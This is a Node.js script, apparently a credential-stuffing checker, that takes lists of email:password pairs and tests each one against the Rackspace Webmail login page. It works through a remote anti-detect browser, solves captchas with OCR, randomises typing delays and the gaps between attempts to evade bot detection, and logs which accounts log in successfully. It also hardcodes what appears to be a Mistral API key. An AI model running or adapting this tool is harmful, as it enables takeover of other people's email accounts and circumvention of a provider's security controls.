/**
 * Rackspace Webmail (apps.rackspace.com) login verification via remote CloakBrowser profile.
 *
 *   node scripts/rackspace_login.mjs "user@example.com:pass"
 *   node scripts/rackspace_login.mjs --batch /path/creds.txt
 *   node scripts/rackspace_login.mjs --batch file --gap 10    (gap seconds, default 15)
 *   node scripts/rackspace_login.mjs --batch file --out /tmp/x.json
 *
 * Flow: GET apps.rackspace.com -> ASP.NET login form (username/password + antiforgery token)
 *   -> POST /wmidentity/Account/Login?ReturnUrl=... -> 302.
 * Wrong creds: redirect back to /wmidentity/account/login?reval=Username / Password incorrect
 * Success:    redirect through /wmidentity/connect/authorize/callback -> login.php (webmail).
 * Resumable: results JSON after every attempt; definitive statuses skipped on restart.
 * Remote browser: fresh page + cookie clear per attempt (browser is CBM-owned, not killable).
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CDP = 'wss://clk.mrme.tech/api/profiles/912925dd-a2fc-48db-b364-0259330952cd/cdp';
const CDP_TOKEN = process.env.CBPM_API_TOKEN || 'change-me-to-a-secure-token';
const LOGIN = 'https://apps.rackspace.com';
const OCR_KEY = process.env.MISTRAL_API_KEY || 'TLlIUOIuh6tcApbkjKg61iB3nj6LrwEm';
const rand = (min, max) => min + Math.random() * (max - min);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function connect() {
  return chromium.connectOverCDP(CDP, { timeout: 30000, headers: { Authorization: 'Bearer ' + CDP_TOKEN } });
}

/** If a captcha field is present, read the captcha image via Mistral OCR and return the code. */
async function solveCaptchaIfPresent(page) {
  const cap = await page.evaluate(() => {
    const inp = document.querySelector('input[name=captcha], #captcha, input#captcha-input');
    if (!inp) return null;
    const img = document.querySelector('img[src*=captcha], img[src*=Captcha], #captcha-image, .captcha img');
    if (!img) return null;
    const c = document.createElement('canvas');
    c.width = img.width || 200; c.height = img.height || 60;
    const x = c.getContext('2d');
    try { x.drawImage(img, 0, 0, c.width, c.height); } catch { return null; }
    return { b64: c.toDataURL('image/png').split(',')[1] };
  });
  if (!cap) return null;
  const resp = await fetch('https://api.mistral.ai/v1/ocr', {
    method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + OCR_KEY },
    body: JSON.stringify({ model: 'mistral-ocr-latest', document: { type: 'image_url', image_url: 'data:image/png;base64,' + cap.b64 } }),
  });
  if (!resp.ok) return null;
  const md = String((await resp.json())?.pages?.[0]?.markdown || '');
  return md.replace(/[^A-Za-z0-9]/g, '').slice(0, 10) || null;
}

async function typeField(page, selector, text) {
  await page.click(selector);
  await sleep(rand(150, 450));
  await page.fill(selector, text); // ASP.NET form: instant value ok, keep organic pacing
  await sleep(rand(120, 350));
}

async function tryLogin(browser, u, p) {
  const ctx = browser.contexts()[0];
  const page = await ctx.newPage();
  let reval = ''; // error carried by the 302 Location header of the Login POST
  let submitted = false;
  page.on('response', r => {
    if (r.request().method() === 'POST' && r.url().includes('/wmidentity/Account/Login')) {
      submitted = true;
      const loc = r.headers()['location'] || '';
      const m = loc.match(/[?&]reval=([^&]+)/);
      if (m) { try { reval = decodeURIComponent(m[1]); } catch { reval = m[1]; } }
    }
  });
  try {
    await ctx.clearCookies(); // no leftover session / WAF state from previous attempts
    await page.goto(LOGIN, { waitUntil: 'load', timeout: 60000 });

    // recaptcha readiness gate: webmailLogin.js injects invisible reCAPTCHA;
    // when the proxy can't reach Google, no token is produced and submit silently
    // blocks (no POST). Wait for the sitekey + grecaptcha before filling anything.
    let ready = false;
    for (let i = 0; i < 6 && !ready; i++) {
      await sleep(2000);
      ready = await page.evaluate(() =>
        typeof window.grecaptcha === 'object' && !!document.querySelector('[data-sitekey]')
      ).catch(() => false);
    }
    const hasForm = await page.evaluate(() => !!document.querySelector('#form input[name=username]')).catch(() => false);
    if (!hasForm) return { status: 'UNKNOWN', detail: 'login form not present (page: ' + page.url().slice(0, 80) + ')' };
    if (!ready) return { status: 'CAPTCHA_FAIL', detail: 'recaptcha never loaded (proxy blocked google.com?)' };

    const captchaCode = await solveCaptchaIfPresent(page);
    if (captchaCode !== null && !captchaCode) return { status: 'CAPTCHA_FAIL', detail: 'captcha unreadable' };

    await typeField(page, '#user-input', u);
    await sleep(rand(250, 550));
    await typeField(page, '#pass-input', p);
    await sleep(rand(300, 700));
    if (captchaCode) {
      await typeField(page, 'input[name=captcha], #captcha', captchaCode);
      await sleep(rand(300, 700));
    }
    await sleep(rand(400, 1200));

    await page.click('button:has-text("Log In")');
    // wait for the Login POST to fire (recaptcha token generation takes a moment)
    for (let i = 0; i < 8 && !submitted; i++) await sleep(1500);
    if (!submitted) return { status: 'CAPTCHA_FAIL', detail: 'no Login POST (recaptcha token blocked)' };
    await sleep(rand(8000, 10000)); // let the 302 + redirect chain settle

    // the redirect chain can still be settling; retry the read across navigations
    let state = null;
    for (let i = 0; i < 4 && !state; i++) {
      try {
        state = await page.evaluate(() => ({
          url: location.href,
          body: document.body.innerText.replace(/\s+/g, ' ').slice(0, 300),
          hasCaptcha: !!document.querySelector('input[name=captcha], #captcha'),
        }));
      } catch (e) {
        if (!/destroyed|navigation/i.test(String(e))) throw e;
        await sleep(1500);
      }
    }
    if (!state) return { status: 'ERROR', detail: 'page kept navigating, no stable read' };
    if (reval) state.reval = reval; // prefer the 302 Location error (deterministic)
    return classify(state);
  } finally {
    await page.close().catch(() => {});
  }
}

function classify(o) {
  const t = (o.reval + ' ' + o.body);
  const onLogin = o.url.includes('/wmidentity/account/login') || /Webmail Login/i.test(t);
  // chrome-error/about/blank pages mean the connection died, not a successful login
  if (!onLogin && /^https?:\/\//.test(o.url)) return { status: 'SUCCESS', detail: 'left login page: ' + o.url.slice(0, 90) };
  if (!/^https?:\/\//.test(o.url)) return { status: 'ERROR', detail: 'connection failed (page: ' + o.url.slice(0, 60) + ')' };
  if (/(lock|temporar|too many|suspended|disabled|attempt)/i.test(t)) return { status: 'LOCKED', detail: t.slice(0, 120) };
  if (/(username\s*\/\s*password incorrect|incorrect|invalid)/i.test(t)) return { status: 'INVALID_CREDS', detail: t.slice(0, 120) };
  if (o.hasCaptcha) return { status: 'CAPTCHA_FAIL', detail: 'captcha shown after submit' };
  return { status: 'UNKNOWN', detail: t.slice(0, 140) };
}

/** Accept `user:pass` or `url:user:pass` lines (rackspace.txt quotes passwords inconsistently). */
function parsePair(line) {
  line = line.trim();
  if (!line) return null;
  const looksUrl = /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(line);
  if (looksUrl) {
    const i1 = line.indexOf(':');
    const i2 = line.indexOf(':', i1 + 1);
    if (i1 === -1 || i2 === -1) return null;
    return [line.slice(i1 + 1, i2), line.slice(i2 + 1).replace(/^"+|"+$/g, '')];
  }
  const i = line.indexOf(':');
  if (i === -1) return null;
  return [line.slice(0, i), line.slice(i + 1)];
}

// ---- main ----
const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.filter(a => !a.startsWith('--')).join(',');
const lines = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n') : (raw || '').split(',')).map(parsePair).filter(Boolean);
const seen = new Set();
const pairs = lines.filter(([u]) => (seen.has(u) ? false : (seen.add(u), true)));
if (!pairs.length) { console.log('usage: node rackspace_login.mjs "user:pass" | --batch <file>'); process.exit(1); }

const gapIdx = args.indexOf('--gap');
const GAP_BASE = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 15 : 15;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/rackspace_batch_results.json';
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_CREDS: 1, LOCKED: 1, SUCCESS: 1 };

let browser = null;
try {
  for (const [u, p] of pairs) {
    if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
    if (!browser) browser = await connect();
    // fresh-page retry loop for transient failures (recaptcha/WAF/connection drops)
    let res;
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        res = await tryLogin(browser, u, p);
        console.log(`${u} -> ${res.status} (${res.detail})`);
        if (res.status !== 'CAPTCHA_FAIL' && res.status !== 'ERROR') break;
      } catch (e) {
        console.log(`${u} -> ERROR: ${e.message.slice(0, 100)}`);
        res = { status: 'ERROR', detail: e.message.slice(0, 150) };
        try { await browser.close(); } catch {} // close the WS connection; reconnect fresh next cred
        browser = null;
        break;
      }
    }
    results[u] = res;
    fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
    if (batchIdx !== -1 && pairs.length > 1) { const gap = rand(GAP_BASE * 0.5, GAP_BASE * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
  }
} finally {
  if (browser) await browser.close().catch(() => {});
}
console.log('results saved to ' + OUT);
